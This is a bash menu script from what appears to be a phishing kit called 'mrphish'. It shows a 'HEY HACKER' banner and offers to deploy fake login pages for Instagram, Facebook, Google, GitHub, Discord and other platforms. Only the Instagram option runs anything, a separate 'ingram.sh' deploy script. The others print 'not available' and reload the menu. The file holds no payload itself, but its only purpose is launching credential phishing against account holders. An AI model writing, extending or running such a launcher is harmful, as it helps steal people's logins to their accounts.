clear
echo -e "
                      __  __  ____  _  _  __  __ 
                     (  \/  )( ___)( \( )(  )(  )
                      )    (  )__)  )  (  )(__)( 
                     (_/\/\_)(____)(_)\_)(______)"
echo
echo -e "\e[96m        |-----------------------------------------------------|"                                                     
echo -e "\e[96m        |-------------------\e[92mSELECT OPTIONS\e[96m--------------------|"
echo -e "\e[96m        |-----------------------------------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                [\e[92m1\e[96m]==> INSTAGRAM                     |"
echo -e "\e[96m        |                [\e[92m2\e[96m]==> FACEBOOK                      |"
echo -e "\e[96m        |                [\e[92m3\e[96m]==> SNAPCHAT                      |"
echo -e "\e[96m        |                [\e[92m4\e[96m]==> GOOGLE                        |"
echo -e "\e[96m        |                [\e[92m5\e[96m]==> GITHUB                        |"
echo -e "\e[96m        |                [\e[92m6\e[96m]==> WHATSAPP                      |"
echo -e "\e[96m        |                [\e[92m7\e[96m]==> LINKEDIN                      |"
echo -e "\e[96m        |                [\e[92m8\e[96m]==> TELEGRAM                      |"
echo -e "\e[96m        |                [\e[92m9\e[96m]==> TUMBLER                       |"
echo -e "\e[96m        |                [\e[92m10\e[96m]==> MINECRAFT                    |"
echo -e "\e[96m        |                [\e[92m11\e[96m]==> TWITCH                       |"
echo -e "\e[96m        |                [\e[92m12\e[96m]==> DISCORD                      |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |-----------------------------------------------------|"
echo -e "\e[96m        |---------------------\e[91mHEY HACKER\e[96m----------------------|"
echo -e "\e[96m        |-----------------------------------------------------|"
sleep 2.0
read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] SELECT OPTION: \e[0m' option
if [[ $option == 1 || $option == 01 ]]; then
echo
cd $HOME/mrphish/core/deploys/instagram
clear
bash ingram.sh
echo
elif [[ $option == 2 || $option == 02 ]]; then
echo
echo -e "\e[96m                    -------------------------------"
echo -e "                    |\e[91m NOT AVAIALABLE FOR NOW.....!\e[96m|"
echo -e "\e[96m                    -------------------------------"
sleep 3.0
bash menu.sh
elif [[ $option == 3 || $option == 03 ]]; then
echo                                                                                                      
echo -e "\e[96m                    -------------------------------"
echo -e "                    |\e[91m NOT AVAIALABLE FOR NOW.....!\e[96m|"
echo -e "\e[96m                    -------------------------------"
sleep 3.0                                                                   
bash menu.sh
elif [[ $option == 4 || $option == 04 ]]; then
echo
echo -e "\e[96m                    -------------------------------"
echo -e "                    |\e[91m NOT AVAIALABLE FOR NOW.....!\e[96m|"
echo -e "\e[96m                    -------------------------------"
sleep 3.0                                                                   
bash menu.sh
elif [[ $option == 5 || $option == 05 ]]; then
echo
echo -e "\e[96m                    -------------------------------"
echo -e "                    |\e[91m NOT AVAIALABLE FOR NOW.....!\e[96m|"
echo -e "\e[96m                    -------------------------------"
sleep 3.0                                                                   
bash menu.sh
elif [[ $option == 6 || $option == 06 ]]; then
echo
echo -e "\e[96m                    -------------------------------"
echo -e "                    |\e[91m NOT AVAIALABLE FOR NOW.....!\e[96m|"
echo -e "\e[96m                    -------------------------------"
sleep 3.0                                                                  
bash menu.sh
elif [[ $option == 7 || $option == 07 ]]; then
echo
echo -e "\e[96m                    -------------------------------"
echo -e "                    |\e[91m NOT AVAIALABLE FOR NOW.....!\e[96m|"
echo -e "\e[96m                    -------------------------------"
sleep 3.0                                                                   
bash menu.sh
elif [[ $option == 8 || $option == 08 ]]; then
echo
echo -e "\e[96m                    -------------------------------"
echo -e "                    |\e[91m NOT AVAIALABLE FOR NOW.....!\e[96m|"
echo -e "\e[96m                    -------------------------------"
sleep 3.0                                                                   
bash menu.sh
elif [[ $option == 9 || $option == 09 ]]; then
echo
echo -e "\e[96m                    -------------------------------"
echo -e "                    |\e[91m NOT AVAIALABLE FOR NOW.....!\e[96m|"
echo -e "\e[96m                    -------------------------------"
sleep 3.0                                                                   
bash menu.sh
elif [[ $option == 10 || $option == 10 ]]; then
echo
echo -e "\e[96m                    -------------------------------"
echo -e "                    |\e[91m NOT AVAIALABLE FOR NOW.....!\e[96m|"
echo -e "\e[96m                    -------------------------------"
sleep 3.0                                                                   
bash menu.sh
elif [[ $option == 11 || $option == 11 ]]; then
echo
echo -e "\e[96m                    -------------------------------"
echo -e "                    |\e[91m NOT AVAIALABLE FOR NOW.....!\e[96m|"
echo -e "\e[96m                    -------------------------------"
sleep 3.0                                                                   
bash menu.sh
elif [[ $option == 12 || $option == 12 ]]; then
echo
echo -e "\e[96m                    -------------------------------"
echo -e "                    |\e[91m NOT AVAIALABLE FOR NOW.....!\e[96m|"
echo -e "\e[96m                    -------------------------------"
sleep 3.0                                                                   
bash menu.sh
elif [[ $option == 13 || $option == 13 ]]; then
echo                                                                                                      
echo -e "\e[96m                    -------------------------------"
echo -e "                    |\e[91m NOT AVAIALABLE FOR NOW.....!\e[96m|"
echo -e "\e[96m                    -------------------------------"
sleep 3.0                                                                   
bash menu.sh
elif [[ $option == 0 ]]; then
clear
echo
printf "                     \e[1;96m Have A Good Day ........! \e[0m\n"
echo
sleep 3.0
exit 3
else
printf "                      \e[1;96m [!] Invalid option!\e[0m\n"
sleep 4.0
bash menu.sh
fi

